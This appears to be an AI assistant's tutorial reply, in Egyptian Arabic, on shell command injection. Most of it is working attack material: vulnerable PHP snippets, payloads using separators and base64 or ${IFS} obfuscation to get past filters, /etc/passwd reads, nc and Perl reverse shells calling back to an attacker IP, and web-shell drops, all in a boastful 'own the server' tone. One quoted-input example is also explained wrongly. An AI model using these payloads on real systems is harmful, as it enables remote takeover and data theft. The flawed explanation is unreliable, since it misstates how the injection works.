تمام، زي ما فهمت إنك عايز شرح لنفس القسم مرة تانية "تقنيات حقن أوامر الـ Shell" (Shell Command Injection Techniques)، بس هحاول أعمل الشرح مختلف شوية في الأمثلة والتفاصيل عشان تستفيد أكتر، مع الحفاظ على نفس الطريقة: شرح عملي مع أكواد وأوامر، خلاصة Pentest بالعامية المصرية بعد كل جزء، وسيناريوهات استغلال في الآخر.

---
### **1. حقن الأوامر باستخدام الفواصل (Command Injection with Separators)**
#### **شرح عملي:**
الحقن هنا بيعتمد على إنك تضيف أوامرك للأمر الأصلي باستخدام فواصل زي `;` (للتنفيذ المتتابع)، `&&` (لو الأول نجح)، أو `|` (لتوجيه الخرج). التطبيق لو مش بيفحص المدخلات، بينفذ كل حاجة تبعتها.

- **مثال:** لو فيه أداة بحث بتستخدم `grep` على السيرفر، ممكن تضيف أمرك.

#### **كود عملي (PHP مع حقن بفواصل):**
- كود ضعيف:
```php
<?php
$search = $_GET['query'];
$output = shell_exec("grep '$search' /var/www/data.txt");
echo "<pre>$output</pre>";
?>
```
- ابعت طلب:
```
http://<IP>/search.php?query=test; whoami
```
- السيرفر هينفذ `grep 'test; whoami' /var/www/data.txt`، وبعدها `whoami` لوحده، ويرجعلك اسم المستخدم.

#### **أمر عملي (تجربة يدوية):**
```bash
curl "http://<IP>/search.php?query=hello||id"
```
- لو رجعلك `uid=33(www-data)`، يبقى الفاصل `||` نفع (ينفذ الأمر التاني لو الأول فشل).

#### **خلاصة Pentest بالعامية:**
"جرب حط فواصل زي `;` أو `||` بعد المدخل العادي، واضيف حاجة زي `id` أو `whoami`. لو السيرفر نفذها، يبقى بيسمع الكلام وتقدر تخليه يغنيلك!"

---

## **2. حقن الأوامر باستخدام التشفير أو التضليل (Obfuscation Techniques)**
#### **شرح عملي:**
لو التطبيق فيه فلتر بسيط (زي منع كلمات زي `whoami` أو `;`)، بتقدر تتجنبه بتشفير الأوامر (زي Base64) أو استخدام متغيرات Shell زي `${}` أو تضليل بالمسافات.

- **مثال:** تشفير الأمر عشان يعدي الفلتر ويتفك على السيرفر.

#### **كود عملي (PHP مع فلتر):**
- كود بيمنع `whoami`:
```php
<?php
$input = $_GET['input'];
if (strpos($input, "whoami") === false) {
    $output = shell_exec("echo " . $input);
    echo "<pre>$output</pre>";
}
?>
```
- جرب تجاوز:
```
http://<IP>/test.php?input=$(echo d2hvYW1p | base64 -d)
```
- `d2hvYW1p` هو `whoami` مشفر، السيرفر هيفك التشفير وينفذه.

#### **أمر عملي (تضليل بالمسافات):**
- لو الفلتر بيمنع `;`， جرب:
```bash
curl "http://<IP>/test.php?input=test${IFS}id"
```
- `${IFS}` بديل المسافة في Shell، ينفذ `test id`.

#### **خلاصة Pentest بالعامية:**
"لو السيرفر بيفلتر حاجات، شفر الأوامر بـ Base64 أو استخدم `${IFS}` بدل المسافة. جرب كمان حاجات زي `$(id)` وشوف لو بيعدي الفلتر ويجيبلك اللي عايزه!"

---

### **3. حقن أوامر لفتح Shell كامل (Full Shell Access)**
#### **شرح عملي:**
التقنية دي بتركز على استخدام الحقن عشان تفتح Reverse Shell أو تكتب ملف Web Shell، بدل مجرد تنفيذ أوامر بسيطة. الهدف إنك تتحكم في السيرفر بشكل كامل عن بُعد.

#### **كود عملي (Reverse Shell):**
- لو فيه ثغرة زي المثال الأول:
```
http://<IP>/search.php?query=test; nc -e /bin/bash <YOUR_IP> 4444
```
- استمع على جهازك:
```bash
nc -lvnp 4444
```
- لو اتفتحت شاشة Shell، يبقى بقيت الBoss.

#### **كود عملي (كتابة Web Shell):**
- ابعت:
```
http://<IP>/search.php?query=test; echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php
```
- افتح:
```
http://<IP>/shell.php?cmd=whoami
```

#### **خلاصة Pentest بالعامية:**
"لو عايز تتحكم كامل، جرب تفتح Reverse Shell بـ `nc` أو اكتب Web Shell بـ `echo`. لو نجحت، يبقى السيرفر بقى بتاعك وتقدر تعمل فيه اللي نفسك فيه!"

---

### **سيناريوهات الاستغلال الممكنة (Exploitation Scenarios):**
1. **Basic Separators:**
   - نفذ أوامر بسيطة:
     ```bash
     curl "http://<IP>/search.php?query=test; cat /etc/passwd"
     ```
     لو رجعلك الملف، يبقى نجحت.

2. **Obfuscation:**
   - Base64:
     ```bash
     curl "http://<IP>/search.php?query=test; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash"
     ```
     (يعني `cat /etc/passwd`).
   - Variable Substitution:
     ```bash
     curl "http://<IP>/search.php?query=test${IFS}$(whoami)"
     ```

3. **Full Shell Access:**
   - **Reverse Shell:**
     ```bash
     curl "http://<IP>/search.php?query=test; perl -e 'use Socket;\$i=\"<YOUR_IP>\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
     ```
     استمع: `nc -lvnp 4444`.
   - **Web Shell:**
     ```bash
     curl "http://<IP>/search.php?query=test; printf '<?php system(\$_GET[cmd]); ?>' > /var/www/html/shell.php"
     ```
     استخدم: `http://<IP>/shell.php?cmd=id`.

4. **مشترك:**
   - **Blind Injection:** لو ما بيرجعش رد:
     ```bash
     curl "http://<IP>/search.php?query=test; ping -c 10 <YOUR_IP>"
     ```
     شوف الـ ping على جهازك.
   - **File Creation:** اكتب ملف:
     ```bash
     curl "http://<IP>/search.php?query=test; echo 123 > /tmp/test.txt"
     ```
     جرب تسحبه بعدين.
   - **Automated Testing:** استخدم wfuzz:
     ```bash
     wfuzz -c -z file,/usr/share/wordlists/payloads.txt "http://<IP>/search.php?query=testFUZZ"
     ```

---

لو عايز تفاصيل أكتر عن أي سيناريو أو كود استغلال معين، أو عايز حاجة مختلفة، قوللي وأنا أفصلك!